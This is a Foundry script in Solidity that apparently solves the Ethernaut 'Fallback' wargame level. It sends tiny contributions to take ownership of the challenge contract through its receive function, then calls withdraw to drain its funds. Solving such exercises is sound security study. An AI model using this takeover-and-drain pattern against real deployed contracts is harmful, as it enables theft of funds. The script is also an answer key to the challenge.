// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import {Script, console} from "forge-std/Script.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(0x628577AF061e0009224Ed0c302cA452ADB6Bec85));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
